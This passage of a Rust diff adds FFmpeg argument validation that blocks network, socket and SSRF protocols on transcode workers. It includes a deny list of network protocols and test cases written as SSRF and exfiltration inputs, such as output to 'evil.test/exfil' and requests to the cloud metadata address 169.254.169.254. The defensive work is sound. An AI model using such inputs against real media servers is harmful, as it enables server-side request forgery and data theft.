@@ -84,6 +84,81 @@ impl Capability {
     }
 }
 
+/// Local-only FFmpeg protocol whitelist enforced on transcode workers.
+pub const WORKER_LOCAL_PROTOCOL_WHITELIST: &str = "file,pipe,fd,crypto,data,subfile";
+
+/// Individual FFmpeg protocols allowed on isolated transcode workers.
+pub const ALLOWED_LOCAL_PROTOCOLS: &[&str] = &["file", "pipe", "fd", "crypto", "data", "subfile"];
+
+const MAX_PROTOCOL_WRAPPER_DEPTH: usize = 8;
+
+/// FFmpeg protocols that open network connections or local IPC sockets.
+const NETWORK_PROTOCOLS: &[&str] = &[
+    "http",
+    "https",
+    "httpproxy",
+    "rtsp",
+    "rtsps",
+    "rtmp",
+    "rtmps",
+    "rtmpt",
+    "rtmpe",
+    "rtmpte",
+    "rtmpts",
+    "librtmp",
+    "librtmpe",
+    "librtmps",
+    "librtmpt",
+    "librtmpte",
+    "rtp",
+    "srtp",
+    "prompeg",
+    "udp",
+    "udplite",
+    "tcp",
+    "tls",
+    "dtls",
+    "srt",
+    "libsrt",
+    "rist",
+    "librist",
+    "mms",
+    "mmsh",
+    "mmst",
+    "ftp",
+    "ftps",
+    "sftp",
+    "ssh",
+    "libssh",
+    "smb",
+    "libsmbclient",
+    "nfs",
+    "dav",
+    "davs",
+    "gopher",
+    "gophers",
+    "icecast",
+    "shout",
+    "sctp",
+    "unix",
+    "zmq",
+    "amqp",
+    "ipfs",
+    "ipns",
+    "ws",
+    "wss",
+    "applehttp",
+    "sap",
+];
+
+/// Nested FFmpeg wrapper protocols whose inner URL specification must be inspected recursively.
+const WRAPPER_PROTOCOLS: &[&str] = &[
+    "async", "cache", "crypto", "subfile", "hls", "tee", "md5", "concatf",
+];
+
+/// Base local-only FFmpeg protocols that do not wrap another URL.
+const LOCAL_BASE_PROTOCOLS: &[&str] = &["file", "pipe", "fd", "data"];
+
 /// Validates an exact Linux DRM render node path (`/dev/dri/renderD<digits>`).
 pub fn is_valid_render_node_path(path: &str) -> bool {
     path.strip_prefix("/dev/dri/renderD")
@@ -170,6 +245,7 @@ fn option_takes_value(flag: &str) -> bool {
         "-c:",
         "-codec:",
         "-filter:",
+        "-filter_script:",
         "-hwaccel:",
         "-hwaccel_device:",
         "-hwaccel_output_format:",
@@ -221,9 +297,15 @@ fn option_takes_value(flag: &str) -> bool {
             | "-qsv_device"
             | "-vf"
             | "-af"
+            | "-filter"
+            | "-filter_script"
             | "-filter_complex"
             | "-filter_complex_script"
             | "-lavfi"
+            | "-protocol_whitelist"
+            | "-protocol_blacklist"
+            | "-http_proxy"
+            | "-sdp_file"
             | "-map"
             | "-map_metadata"
             | "-map_chapters"
@@ -938,6 +1020,576 @@ pub fn rewrite_any_render_node<S: AsRef<str>>(args: &[S], to: &str) -> Vec<Strin
     rewrite_render_node_internal(args, None, to)
 }
 
+fn is_valid_uri_scheme(scheme: &str) -> bool {
+    let mut bytes = scheme.bytes();
+    let Some(first) = bytes.next() else {
+        return false;
+    };
+    if !first.is_ascii_alphabetic() {
+        return false;
+    }
+    bytes.all(|b| b.is_ascii_alphanumeric() || matches!(b, b'+' | b'.' | b'-'))
+}
+
+fn is_protocol_whitelist_flag(flag: &str) -> bool {
+    flag == "-protocol_whitelist"
+        || flag.starts_with("-protocol_whitelist:")
+        || flag.starts_with("-protocol_whitelist=")
+}
+
+fn is_any_filter_flag(flag: &str) -> bool {
+    flag == "-vf"
+        || flag == "-af"
+        || flag == "-filter"
+        || flag.starts_with("-filter:")
+        || flag == "-filter_complex"
+        || flag == "-lavfi"
+}
+
+fn is_url_option_flag(flag: &str) -> bool {
+    matches!(
+        flag,
+        "-progress"
+            | "-sdp_file"
+            | "-hls_segment_filename"
+            | "-hls_fmp4_init_filename"
+            | "-segment_list"
+            | "-filter_complex_script"
+            | "-filter_script"
+    ) || flag.starts_with("-filter_script:")
+}
+
+/// Returns `true` when a `-protocol_whitelist` value contains only allowed local-only protocols.
+pub fn is_allowed_local_protocol_whitelist(value: &str) -> bool {
+    let mut count = 0usize;
+    for raw_proto in value.split(',') {
+        let proto = raw_proto.trim().to_ascii_lowercase();
+        if proto.is_empty() || !ALLOWED_LOCAL_PROTOCOLS.contains(&proto.as_str()) {
+            return false;
+        }
+        count += 1;
+    }
+    count > 0
+}
+
+fn spec_uses_network_protocol(spec: &str, depth: usize) -> bool {
+    if depth >= MAX_PROTOCOL_WRAPPER_DEPTH {
+        return true;
+    }
+    if spec.is_empty()
+        || spec == "-"
+        || spec.starts_with('/')
+        || spec.starts_with("./")
+        || spec.starts_with("../")
+    {
+        return false;
+    }
+
+    let Some((raw_proto, rest)) = spec.split_once(':') else {
+        return false;
+    };
+
+    // FFmpeg `subfile` supports inline option syntax before `:`, e.g.
+    // `subfile,,start,0,end,1024,,:http://example.com/a.mkv`.
+    if raw_proto.eq_ignore_ascii_case("subfile")
+        || raw_proto.to_ascii_lowercase().starts_with("subfile,")
+    {
+        return spec_uses_network_protocol(rest, depth + 1);
+    }
+
+    if !is_valid_uri_scheme(raw_proto) {
+        return false;
+    }
+
+    let proto = raw_proto.to_ascii_lowercase();
+
+    if rest.starts_with("//") {
+        if proto == "file" {
+            return false;
+        }
+        if proto.contains('+') {
+            let parts: Vec<&str> = proto.split('+').collect();
+            let all_local_chain = parts.len() >= 2
+                && parts.last() == Some(&"file")
+                && parts[..parts.len() - 1]
+                    .iter()
+                    .all(|p| matches!(*p, "crypto" | "async" | "cache" | "subfile"));
+            return !all_local_chain;
+        }
+        // Any other `<scheme>://` (http, https, rtsp, udp, unix, gopher, hls+http, etc.)
+        // is treated as a network/remote/socket protocol.
+        return true;
+    }
+
+    // Single-colon `<proto>:<rest>` without `//`.
+    if proto == "concat" {
+        return rest
+            .split('|')
+            .any(|segment| spec_uses_network_protocol(segment, depth + 1));
+    }
+
+    if WRAPPER_PROTOCOLS.contains(&proto.as_str()) {
+        return spec_uses_network_protocol(rest, depth + 1);
+    }
+
+    if proto.contains('+') {
+        let parts: Vec<&str> = proto.split('+').collect();
+        if parts.iter().any(|p| NETWORK_PROTOCOLS.contains(p)) {
+            return true;
+        }
+        if parts.iter().all(|p| !p.is_empty()) {
+            if parts.contains(&"concat") {
+                return rest
+                    .split('|')
+                    .any(|segment| spec_uses_network_protocol(segment, depth + 1));
+            }
+            if parts
+                .iter()
+                .all(|p| WRAPPER_PROTOCOLS.contains(p) || LOCAL_BASE_PROTOCOLS.contains(p))
+            {
+                if parts.iter().any(|p| WRAPPER_PROTOCOLS.contains(p)) {
+                    return spec_uses_network_protocol(rest, depth + 1);
+                }
+                return false;
+            }
+        }
+        return false;
+    }
+
+    if NETWORK_PROTOCOLS.contains(&proto.as_str()) {
+        return true;
+    }
+
+    if LOCAL_BASE_PROTOCOLS.contains(&proto.as_str()) {
+        return false;
+    }
+
+    // Unknown single-colon prefixes without `//` (such as local filenames `Movie: Part 1.mkv`)
+    // are not network protocols.
+    false
+}
+
+/// Checks an output specification, including FFmpeg `-f tee` syntax (`[opts]url|[opts]url`).
+fn output_spec_uses_network_protocol(spec: &str) -> bool {
+    if spec_uses_network_protocol(spec, 0) {
+        return true;
+    }
+    if spec.starts_with('[') {
+        for segment in spec.split('|') {
+            let trimmed = segment.trim();
+            let candidate = if trimmed.starts_with('[') {
+                if let Some(close) = trimmed.find(']') {
+                    trimmed[close + 1..].trim()
+                } else {
+                    trimmed
+                }
+            } else {
+                trimmed
+            };
+            if spec_uses_network_protocol(candidate, 0) {
+                return true;
+            }
+        }
+    }
+    false
+}
+
+/// Splits a filter's argument string on unquoted, unescaped `:`.
+fn split_filter_args(args: &str) -> Vec<&str> {
+    let mut parts = Vec::new();
+    let bytes = args.as_bytes();
+    let mut start = 0usize;
+    let mut i = 0usize;
+    let mut in_single = false;
+    let mut in_double = false;
+    let mut escaped = false;
+
+    while i < bytes.len() {
+        let b = bytes[i];
+        if escaped {
+            escaped = false;
+            i += 1;
+            continue;
+        }
+        match b {
+            b'\\' if !in_single => escaped = true,
+            b'\'' if !in_double => in_single = !in_single,
+            b'"' if !in_single => in_double = !in_double,
+            b':' if !in_single && !in_double => {
+                parts.push(&args[start..i]);
+                start = i + 1;
+            }
+            _ => {}
+        }
+        i += 1;
+    }
+    if start <= args.len() {
+        parts.push(&args[start..]);
+    }
+    parts
+}
+
+/// Unquotes and unescapes an FFmpeg filter argument value (such as `http\://...` or `'https://...'`).
+fn unescape_filter_value(raw: &str) -> String {
+    let trimmed = raw.trim();
+    if trimmed.len() >= 2 && trimmed.starts_with('\'') && trimmed.ends_with('\'') {
+        return trimmed[1..trimmed.len() - 1].to_string();
+    }
+    let body = if trimmed.len() >= 2 && trimmed.starts_with('"') && trimmed.ends_with('"') {
+        &trimmed[1..trimmed.len() - 1]
+    } else {
+        trimmed
+    };
+    let mut out = String::with_capacity(body.len());
+    let mut chars = body.chars();
+    while let Some(ch) = chars.next() {
+        if ch == '\\' {
+            if let Some(next) = chars.next() {
+                out.push(next);
+            } else {
+                out.push('\\');
+            }
+        } else {
+            out.push(ch);
+        }
+    }
+    out
+}
+
+fn is_ascii_filter_option_key(s: &str) -> bool {
+    !s.is_empty()
+        && s.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'-'))
+}
+
+/// Inspects an FFmpeg filtergraph for network filters (`zmq`/`azmq`) or file-loading filters
+/// (`movie`, `amovie`, `subtitles`, `ass`, `lut3d`, `sendcmd`, `asendcmd`, `drawtext` file params)
+/// referencing remote/network URLs.
+fn filtergraph_uses_network_protocol(graph: &str) -> bool {
+    for raw_node in split_filtergraph_nodes(graph) {
+        let Some((name, args_opt)) = parse_filter_node(raw_node) else {
+            continue;
+        };
+        let lower = name.to_ascii_lowercase();
+        if matches!(lower.as_str(), "zmq" | "azmq") {
+            return true;
+        }
+        let Some(args) = args_opt else {
+            continue;
+        };
+        match lower.as_str() {
+            "movie" | "amovie" | "subtitles" | "ass" | "lut3d" | "sendcmd" | "asendcmd" => {
+                for (idx, part) in split_filter_args(args).into_iter().enumerate() {
+                    let trimmed = part.trim();
+                    let candidate = if let Some((k, v)) = trimmed.split_once('=') {
+                        let key = k.trim();
+                        if key.eq_ignore_ascii_case("filename")
+                            || key.eq_ignore_ascii_case("f")
+                            || key.eq_ignore_ascii_case("file")
+                        {
+                            Some(unescape_filter_value(v))
+                        } else if idx == 0 && !is_ascii_filter_option_key(key) {
+                            // Positional URL containing `=` in query parameters (e.g. `movie=https\://host/a?k=v`).
+                            Some(unescape_filter_value(trimmed))
+                        } else {
+                            None
+                        }
+                    } else if idx == 0 {
+                        Some(unescape_filter_value(trimmed))
+                    } else {
+                        None
+                    };
+                    if let Some(val) = candidate {
+                        if spec_uses_network_protocol(&val, 0) {
+                            return true;
+                        }
+                    }
+                }
+            }
+            "drawtext" => {
+                for part in split_filter_args(args) {
+                    if let Some((k, v)) = part.trim().split_once('=') {
+                        let key = k.trim();
+                        if key.eq_ignore_ascii_case("fontfile")
+                            || key.eq_ignore_ascii_case("textfile")
+                        {
+                            let val = unescape_filter_value(v);
+                            if spec_uses_network_protocol(&val, 0) {
+                                return true;
+                            }
+                        }
+                    }
+                }
+            }
+            _ => {}
+        }
+    }
+    false
+}
+
+/// Returns `true` if `args` contains any `-protocol_whitelist` flag whose value is missing,
+/// empty, malformed, or permits any protocol outside [`ALLOWED_LOCAL_PROTOCOLS`].
+pub fn has_disallowed_protocol_whitelist<S: AsRef<str>>(args: &[S]) -> bool {
+    let mut i = 0usize;
+    while i < args.len() {
+        let arg = args[i].as_ref();
+        if arg == "--" {
+            break;
+        }
+        if let Some(val) = arg.strip_prefix("-protocol_whitelist=") {
+            if !is_allowed_local_protocol_whitelist(val) {
+                return true;
+            }
+            i += 1;
+            continue;
+        }
+        if arg == "-protocol_whitelist" || arg.starts_with("-protocol_whitelist:") {
+            let Some(val) = args.get(i + 1).map(AsRef::as_ref) else {
+                return true;
+            };
+            if !is_allowed_local_protocol_whitelist(val) {
+                return true;
+            }
+            i += 2;
+            continue;
+        }
+        if option_takes_value(arg) {
+            i += 2;
+            continue;
+        }
+        i += 1;
+    }
+    false
+}
+
+/// Returns `true` when `args` references any network, remote, or Unix-socket FFmpeg protocol
+/// (including nested wrapper specs like `async:http://`, `cache:https://`, `crypto:http://`,
+/// `subfile:http://`, `concat:http://...`, compound `hls+http://`, filtergraph URLs, URL-taking
+/// options such as `-progress http://...`, positional network outputs, or a caller-supplied
+/// `-protocol_whitelist` permitting non-local schemes).
+///
+/// Local paths (`file://`, `file:/...`, `/media/Movie: Part 1.mkv`), timestamps (`00:01:23`),
+/// `pipe:0`, `fd:0`, `-`, `data:`, metadata values, and local-only whitelists return `false`.
+pub fn has_network_input<S: AsRef<str>>(args: &[S]) -> bool {
+    let mut i = 0usize;
+    let mut after_double_dash = false;
+    let mut prev_input_format: Option<&str> = None;
+
+    while i < args.len() {
+        let arg = args[i].as_ref();
+        if after_double_dash {
+            if output_spec_uses_network_protocol(arg) {
+                return true;
+            }
+            i += 1;
+            continue;
+        }
+        if arg == "--" {
+            after_double_dash = true;
+            i += 1;
+            continue;
+        }
+
+        let next = args.get(i + 1).map(AsRef::as_ref);
+
+        if let Some(val) = arg.strip_prefix("-protocol_whitelist=") {
+            if !is_allowed_local_protocol_whitelist(val) {
+                return true;
+            }
+            i += 1;
+            continue;
+        }
+        if is_protocol_whitelist_flag(arg) {
+            let Some(val) = next else {
+                return true;
+            };
+            if !is_allowed_local_protocol_whitelist(val) {
+                return true;
+            }
+            i += 2;
+            continue;
+        }
+
+        if arg == "-i" {
+            if let Some(val) = next {
+                if spec_uses_network_protocol(val, 0) {
+                    return true;
+                }
+                if prev_input_format.is_some_and(|fmt| fmt.eq_ignore_ascii_case("lavfi"))
+                    && filtergraph_uses_network_protocol(val)
+                {
+                    return true;
+                }
+                prev_input_format = None;
+                i += 2;
+                continue;
+            }
+            i += 1;
+            continue;
+        }
+
+        if arg == "-f" {
+            if let Some(val) = next {
+                prev_input_format = Some(val);
+                i += 2;
+                continue;
+            }
+            i += 1;
+            continue;
+        }
+
+        if is_any_filter_flag(arg) {
+            if let Some(val) = next {
+                if filtergraph_uses_network_protocol(val) {
+                    return true;
+                }
+                i += 2;
+                continue;
+            }
+            i += 1;
+            continue;
+        }
+
+        if is_url_option_flag(arg) {
+            if let Some(val) = next {
+                if spec_uses_network_protocol(val, 0) {
+                    return true;
+                }
+                i += 2;
+                continue;
+            }
+            i += 1;
+            continue;
+        }
+
+        if arg == "-http_proxy" {
+            if let Some(val) = next {
+                if !val.trim().is_empty() {
+                    return true;
+                }
+                i += 2;
+                continue;
+            }
+            return true;
+        }
+
+        if option_takes_value(arg) {
+            i += 2;
+            continue;
+        }
+
+        if !arg.starts_with('-') && output_spec_uses_network_protocol(arg) {
+            return true;
+        }
+
+        i += 1;
+    }
+
+    false
+}
+
+/// Validates worker `ffmpeg` arguments against SSRF, remote/socket protocols, and caller attempts
+/// to widen `-protocol_whitelist` beyond [`ALLOWED_LOCAL_PROTOCOLS`].
+pub fn validate_worker_args<S: AsRef<str>>(args: &[S]) -> Result<(), String> {
+    if has_disallowed_protocol_whitelist(args) {
+        return Err(
+            "caller -protocol_whitelist attempts to permit non-local FFmpeg protocols".to_string(),
+        );
+    }
+    if has_network_input(args) {
+        return Err(
+            "network, remote, or socket FFmpeg protocols are not permitted on transcode workers"
+                .to_string(),
+        );
+    }
+    Ok(())
+}
+
+/// Enforces [`WORKER_LOCAL_PROTOCOL_WHITELIST`] on every `-i` input (or at the start when no `-i`
+/// is present) so `ffmpeg` cannot follow embedded network URLs inside local playlists (e.g. `.m3u8`
+/// or `.concat`).
+///
+/// Caller-supplied local-only `-protocol_whitelist` flags (already validated by
+/// [`validate_worker_args`]) are preserved without widening them.
+pub fn inject_local_protocol_whitelist<S: AsRef<str>>(args: &[S]) -> Vec<String> {
+    let mut out = Vec::with_capacity(args.len() + 4);
+    let mut i = 0usize;
+    let mut after_double_dash = false;
+    let mut input_has_whitelist = false;
+    let mut saw_any_input = false;
+    let mut saw_any_whitelist = false;
+
+    while i < args.len() {
+        let arg = args[i].as_ref();
+        if after_double_dash {
+            out.push(arg.to_string());
+            i += 1;
+            continue;
+        }
+        if arg == "--" {
+            after_double_dash = true;
+            out.push(arg.to_string());
+            i += 1;
+            continue;
+        }
+
+        if arg == "-protocol_whitelist" || arg.starts_with("-protocol_whitelist:") {
+            input_has_whitelist = true;
+            saw_any_whitelist = true;
+            out.push(arg.to_string());
+            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
+                out.push(val.to_string());
+                i += 2;
+                continue;
+            }
+            i += 1;
+            continue;
+        }
+
+        if arg == "-i" {
+            saw_any_input = true;
+            if !input_has_whitelist {
+                out.push("-protocol_whitelist".to_string());
+                out.push(WORKER_LOCAL_PROTOCOL_WHITELIST.to_string());
+            }
+            out.push(arg.to_string());
+            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
+                out.push(val.to_string());
+                input_has_whitelist = false;
+                i += 2;
+                continue;
+            }
+            input_has_whitelist = false;
+            i += 1;
+            continue;
+        }
+
+        if option_takes_value(arg) {
+            out.push(arg.to_string());
+            if let Some(val) = args.get(i + 1).map(AsRef::as_ref) {
+                out.push(val.to_string());
+                i += 2;
+                continue;
+            }
+            i += 1;
+            continue;
+        }
+
+        out.push(arg.to_string());
+        i += 1;
+    }
+
+    if !saw_any_input && !saw_any_whitelist {
+        let mut prefixed = Vec::with_capacity(out.len() + 2);
+        prefixed.push("-protocol_whitelist".to_string());
+        prefixed.push(WORKER_LOCAL_PROTOCOL_WHITELIST.to_string());
+        prefixed.extend(out);
+        return prefixed;
+    }
+
+    out
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
@@ -1243,6 +1895,495 @@ mod tests {
         assert_eq!(
             any_rewritten[15],
             "subtitles=filename='/tmp/dev/dri/renderD128.ass',scale_vaapi=format=nv12"
+        );
+    }
+
+    #[test]
+    fn has_network_input_detects_remote_and_nested_protocols_without_false_positives() {
+        let positive_cases: &[(&str, &[&str])] = &[
+            (
+                "http input",
+                &["-i", "http://example.com/live.m3u8", "out.ts"],
+            ),
+            (
+                "https input",
+                &["-i", "https://example.com/live.m3u8", "out.ts"],
+            ),
+            (
+                "uppercase HTTP",
+                &["-i", "HTTP://EXAMPLE.COM/live.m3u8", "out.ts"],
+            ),
+            (
+                "rtsp input",
+                &["-i", "rtsp://192.168.1.10:554/stream", "out.ts"],
+            ),
+            (
+                "rtsps input",
+                &["-i", "rtsps://192.168.1.10:322/stream", "out.ts"],
+            ),
+            (
+                "rtmp input",
+                &["-i", "rtmp://live.example.com/app/key", "out.ts"],
+            ),
+            (
+                "rtmps input",
+                &["-i", "rtmps://live.example.com/app/key", "out.ts"],
+            ),
+            (
+                "rtmpt input",
+                &["-i", "rtmpt://live.example.com/app/key", "out.ts"],
+            ),
+            ("rtp input", &["-i", "rtp://239.0.0.1:5004", "out.ts"]),
+            ("udp input", &["-i", "udp://239.0.0.1:1234", "out.ts"]),
+            ("tcp input", &["-i", "tcp://10.0.0.1:8080", "out.ts"]),
+            ("tls input", &["-i", "tls://10.0.0.1:8443", "out.ts"]),
+            ("srt input", &["-i", "srt://10.0.0.1:9000", "out.ts"]),
+            ("mms input", &["-i", "mms://example.com/stream", "out.ts"]),
+            ("mmsh input", &["-i", "mmsh://example.com/stream", "out.ts"]),
+            ("mmst input", &["-i", "mmst://example.com/stream", "out.ts"]),
+            (
+                "ftp input",
+                &["-i", "ftp://files.example.com/a.mkv", "out.ts"],
+            ),
+            (
+                "ftps input",
+                &["-i", "ftps://files.example.com/a.mkv", "out.ts"],
+            ),
+            (
+                "sftp input",
+                &["-i", "sftp://files.example.com/a.mkv", "out.ts"],
+            ),
+            (
+                "smb input",
+                &["-i", "smb://nas.local/media/a.mkv", "out.ts"],
+            ),
+            (
+                "nfs input",
+                &["-i", "nfs://nas.local/export/a.mkv", "out.ts"],
+            ),
+            (
+                "dav input",
+                &["-i", "dav://cloud.example.com/a.mkv", "out.ts"],
+            ),
+            (
+                "davs input",
+                &["-i", "davs://cloud.example.com/a.mkv", "out.ts"],
+            ),
+            ("gopher input", &["-i", "gopher://127.0.0.1:70/1", "out.ts"]),
+            (
+                "icecast input",
+                &["-i", "icecast://radio.example.com:8000/a", "out.ts"],
+            ),
+            ("sctp input", &["-i", "sctp://10.0.0.1:5000", "out.ts"]),
+            (
+                "unix uri input",
+                &["-i", "unix:///run/aetherflow/runner.sock", "out.ts"],
+            ),
+            (
+                "unix single-colon input",
+                &["-i", "unix:/run/aetherflow/runner.sock", "out.ts"],
+            ),
+            (
+                "tcp single-colon input",
+                &["-i", "tcp:127.0.0.1:8080", "out.ts"],
+            ),
+            (
+                "hls+http compound",
+                &["-i", "hls+http://example.com/master.m3u8", "out.ts"],
+            ),
+            (
+                "hls+https compound",
+                &["-i", "hls+https://example.com/master.m3u8", "out.ts"],
+            ),
+            (
+                "async wrapper",
+                &["-i", "async:http://example.com/a.mkv", "out.ts"],
+            ),
+            (
+                "cache wrapper",
+                &["-i", "cache:https://example.com/a.mkv", "out.ts"],
+            ),
+            (
+                "crypto wrapper",
+                &["-i", "crypto:http://example.com/seg.ts", "out.ts"],
+            ),
+            (
+                "crypto+http compound",
+                &["-i", "crypto+http://example.com/seg.ts", "out.ts"],
+            ),
+            (
+                "subfile wrapper",
+                &["-i", "subfile:http://example.com/a.mkv", "out.ts"],
+            ),
+            (
+                "subfile with inline options",
+                &[
+                    "-i",
+                    "subfile,,start,0,end,1024,,:http://169.254.169.254/latest",
+                    "out.ts",
+                ],
+            ),
+            (
+                "concat with remote tail",
+                &[
+                    "-i",
+                    "concat:/srv/media/1.ts|http://example.com/2.ts",
+                    "out.ts",
+                ],
+            ),
+            (
+                "multi-layer nested wrapper",
+                &[
+                    "-i",
+                    "async:cache:crypto:https://example.com/seg.ts",
+                    "out.ts",
+                ],
+            ),
+            (
+                "excessive wrapper nesting fails closed",
+                &[
+                    "-i",
+                    "async:async:async:async:async:async:async:async:file:/srv/a.mkv",
+                    "out.ts",
+                ],
+            ),
+            (
+                "second input is remote",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-i",
+                    "https://example.com/sub.vtt",
+                    "out.m3u8",
+                ],
+            ),
+            (
+                "positional network output",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-f",
+                    "mpegts",
+                    "udp://10.0.0.1:1234",
+                ],
+            ),
+            (
+                "positional network output after --",
+                &["-i", "/srv/media/a.mkv", "--", "http://evil.test/exfil"],
+            ),
+            (
+                "tee muxer network output",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-f",
+                    "tee",
+                    "[f=mpegts]udp://10.0.0.1:1234|[f=mpegts]/tmp/local.ts",
+                ],
+            ),
+            (
+                "progress URL exfil",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-progress",
+                    "http://169.254.169.254/p",
+                    "out.ts",
+                ],
+            ),
+            (
+                "http_proxy flag",
+                &[
+                    "-http_proxy",
+                    "http://127.0.0.1:8080",
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "out.ts",
+                ],
+            ),
+            (
+                "lavfi movie filter SSRF",
+                &[
+                    "-f",
+                    "lavfi",
+                    "-i",
+                    r"movie=http\://169.254.169.254/latest",
+                    "out.ts",
+                ],
+            ),
+            (
+                "vf movie quoted URL with query params",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-vf",
+                    "movie='https://evil.test/a.mp4?token=abc'",
+                    "out.ts",
+                ],
+            ),
+            (
+                "filter_complex amovie filename URL",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-filter_complex",
+                    "amovie=filename='http://evil.test/a.mp3'[a]",
+                    "out.ts",
+                ],
+            ),
+            (
+                "vf subtitles URL",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-vf",
+                    r"subtitles=https\://evil.test/s.srt",
+                    "out.ts",
+                ],
+            ),
+            (
+                "vf zmq network filter",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-vf",
+                    r"zmq=b=tcp\://127.0.0.1\:5555",
+                    "out.ts",
+                ],
+            ),
+            (
+                "caller protocol_whitelist includes http",
+                &[
+                    "-protocol_whitelist",
+                    "file,http,https,tcp,tls,crypto",
+                    "-i",
+                    "/srv/media/playlist.m3u8",
+                    "out.ts",
+                ],
+            ),
+            (
+                "caller protocol_whitelist includes unix",
+                &[
+                    "-protocol_whitelist",
+                    "file,unix",
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "out.ts",
+                ],
+            ),
+            (
+                "caller protocol_whitelist all",
+                &[
+                    "-protocol_whitelist",
+                    "all",
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "out.ts",
+                ],
+            ),
+            (
+                "caller protocol_whitelist empty",
+                &[
+                    "-protocol_whitelist",
+                    "",
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "out.ts",
+                ],
+            ),
+            (
+                "caller protocol_whitelist dangling",
+                &["-i", "/srv/media/a.mkv", "out.ts", "-protocol_whitelist"],
+            ),
+        ];
+
+        for (name, args) in positive_cases {
+            let owned = vec_s(args);
+            assert!(
+                has_network_input(&owned),
+                "expected has_network_input=true for case '{name}': {args:?}"
+            );
+            assert!(
+                validate_worker_args(&owned).is_err(),
+                "expected validate_worker_args=Err for case '{name}': {args:?}"
+            );
+        }
+
+        let negative_cases: &[(&str, &[&str])] = &[
+            ("local path", &["-i", "/srv/media/movies/4k.mkv", "-c:v", "h264_vaapi", "out.m3u8"]),
+            ("file single colon", &["-i", "file:/srv/media/movies/4k.mkv", "out.m3u8"]),
+            ("file triple slash", &["-i", "file:///srv/media/movies/4k.mkv", "out.m3u8"]),
+            ("file localhost", &["-i", "file://localhost/srv/media/movies/4k.mkv", "out.m3u8"]),
+            ("local path with colon", &["-i", "/media/Movie: Part 1.mkv", "out.m3u8"]),
+            ("file prefix with colon", &["-i", "file:/media/Movie: Part 1.mkv", "out.m3u8"]),
+            ("relative filename with colon", &["-i", "Movie: Part 1.mkv", "out.m3u8"]),
+            (
+                "timestamps and seek flags",
+                &["-ss", "00:01:23.456", "-i", "/srv/media/a.mkv", "-to", "00:05:00", "out.m3u8"],
+            ),
+            ("pipe input and output", &["-i", "pipe:0", "-c:v", "libx264", "pipe:1"]),
+            ("dash stdin and stdout", &["-i", "-", "-c:v", "libx264", "-"]),
+            ("fd input and output", &["-i", "fd:0", "-c:v", "libx264", "fd:1"]),
+            ("data URI", &["-i", "data:image/png;base64,iVBORw0KGgo=", "out.mp4"]),
+            ("local subfile wrapper", &["-i", "subfile,,start,0,end,1024,,:/srv/media/a.mkv", "out.ts"]),
+            ("local crypto wrapper", &["-i", "crypto:file:/srv/media/a.ts", "out.ts"]),
+            ("local crypto+file compound", &["-i", "crypto+file:///srv/media/a.ts", "out.ts"]),
+            ("local async/cache wrapper", &["-i", "async:cache:file:///srv/media/a.mkv", "out.ts"]),
+            ("local concat wrapper", &["-i", "concat:/srv/media/1.ts|/srv/media/2.ts", "out.ts"]),
+            (
+                "lavfi parity testsrc2",
+                &[
+                    "-f",
+                    "lavfi",
+                    "-i",
+                    "testsrc2=size=640x360:rate=24",
+                    "-t",
+                    "1",
+                    "-c:v",
+                    "libx264",
+                    "/var/cache/jellyfin/transcodes/.af-parity.ts",
+                ],
+            ),
+            (
+                "URL in metadata value must not false-positive",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-metadata",
+                    "comment=https://jellyfin.org",
+                    "-metadata",
+                    "title=http://movie",
+                    "out.m3u8",
+                ],
+            ),
+            (
+                "local subtitle filter with colon in filename",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-vf",
+                    "subtitles=filename='/var/cache/jellyfin/subtitles/Show: Episode 1.ass':fontsdir='/var/cache/jellyfin/fonts'",
+                    "out.m3u8",
+                ],
+            ),
+            (
+                "drawtext literal URL watermark",
+                &[
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "-vf",
+                    "drawtext=text='https://example.com':fontfile=/usr/share/fonts/a.ttf",
+                    "out.m3u8",
+                ],
+            ),
+            (
+                "bracketed local filename",
+                &["-i", "/srv/media/a.mkv", "[SubGroup] Anime - 01.mkv"],
+            ),
+            (
+                "local progress pipe",
+                &["-i", "/srv/media/a.mkv", "-progress", "pipe:1", "out.m3u8"],
+            ),
+            (
+                "caller local-only protocol_whitelist subset",
+                &["-protocol_whitelist", "file,pipe", "-i", "/srv/media/a.mkv", "out.m3u8"],
+            ),
+            (
+                "caller full local-only protocol_whitelist",
+                &[
+                    "-protocol_whitelist",
+                    WORKER_LOCAL_PROTOCOL_WHITELIST,
+                    "-i",
+                    "/srv/media/a.mkv",
+                    "out.m3u8",
+                ],
+            ),
+        ];
+
+        for (name, args) in negative_cases {
+            let owned = vec_s(args);
+            assert!(
+                !has_network_input(&owned),
+                "expected has_network_input=false for case '{name}': {args:?}"
+            );
+            assert!(
+                validate_worker_args(&owned).is_ok(),
+                "expected validate_worker_args=Ok for case '{name}': {args:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn inject_local_protocol_whitelist_covers_every_input_without_widening_caller_subset() {
+        // Single input receives whitelist directly before `-i`.
+        let single = inject_local_protocol_whitelist(&[
+            "-hwaccel",
+            "vaapi",
+            "-i",
+            "/srv/media/a.mkv",
+            "-c:v",
+            "h264_vaapi",
+            "out.m3u8",
+        ]);
+        assert_eq!(
+            single,
+            vec_s(&[
+                "-hwaccel",
+                "vaapi",
+                "-protocol_whitelist",
+                WORKER_LOCAL_PROTOCOL_WHITELIST,
+                "-i",
+                "/srv/media/a.mkv",
+                "-c:v",
+                "h264_vaapi",
+                "out.m3u8",
+            ])
+        );
+
